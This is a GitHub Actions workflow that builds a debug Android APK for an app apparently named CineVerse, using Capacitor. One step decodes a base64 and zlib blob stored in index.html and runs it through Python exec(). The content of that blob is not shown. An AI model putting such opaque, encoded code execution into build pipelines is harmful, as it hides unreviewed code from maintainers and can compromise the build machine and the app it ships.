name: Build APK
on:
  push:
    branches: [android-app]
  workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Check files
        run: |
          echo "Files in the repo:"
          ls -la
          if [ ! -f index.html ]; then
            f=$(ls index.html* 2>/dev/null | head -n 1)
            if [ -n "$f" ]; then
              echo "NOTICE: index.html was not found, using $f instead. Rename it to index.html when you can."
              cp "$f" index.html
            else
              echo "ERROR: there is no index.html in the android-app branch. Upload it to the main folder."
              exit 1
            fi
          fi
          if [ ! -f package.json ]; then echo "ERROR: package.json is missing"; exit 1; fi
          if [ ! -f capacitor.config.json ] && [ ! -f capacitor.config.ts ]; then echo "ERROR: capacitor.config is missing"; exit 1; fi
          echo "index.html size:"; wc -c index.html
      - uses: actions/setup-node@v4
        with:
          node-version: 20
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17
      - run: npm install
      - name: Prepare web files
        run: |
          mkdir -p www
          cp index.html www/
          if [ -f sw.js ]; then cp sw.js www/; else echo "// no service worker" > www/sw.js; fi
          ls -la www
      - run: npx cap add android
      - run: npx cap sync android
      - run: sed -i 's#</manifest>#    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />\n</manifest>#' android/app/src/main/AndroidManifest.xml
      - name: Add CineVerse native features
        run: |
          python3 - <<'PY'
          import re,base64,zlib,sys
          h=open('index.html',encoding='utf-8').read()
          m=re.search(r'id="cv-native-patch">([^<]*)<',h)
          if not m:
              print('WARNING: this index.html has no native patch. Building without the themed icons, ads and notifications.')
              sys.exit(0)
          exec(zlib.decompress(base64.b64decode(m.group(1))).decode())
          PY
      - name: Build APK
        run: |
          set +e
          (cd android && chmod +x gradlew && ./gradlew assembleDebug --no-daemon > ../build1.log 2>&1)
          code=$?
          if [ $code -ne 0 ]; then
            echo "---- last lines of the failed build ----"
            tail -n 80 build1.log
            {
              echo "### The build with CineVerse native features FAILED"
              echo "Send a screenshot of this box to get it fixed."
              echo '```'
              grep -E "error:|FAILED|What went wrong|Could not|Execution failed|AAPT|Manifest merger|Duplicate class|requires" -A3 build1.log | head -60
              echo '```'
            } >> "$GITHUB_STEP_SUMMARY"
            echo "Building again without the native features so you still get an APK."
            rm -rf android
            npx cap add android
            npx cap sync android
            sed -i 's#</manifest>#    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />\n</manifest>#' android/app/src/main/AndroidManifest.xml
            (cd android && chmod +x gradlew && ./gradlew assembleDebug --no-daemon) || exit 1
            echo "NOTE: this APK was built WITHOUT the themed icons, ads and notifications." >> "$GITHUB_STEP_SUMMARY"
          else
            echo "The build with all native features succeeded." >> "$GITHUB_STEP_SUMMARY"
          fi
      - uses: actions/upload-artifact@v4
        with:
          name: CineVerse-apk
          path: android/app/build/outputs/apk/debug/app-debug.apk
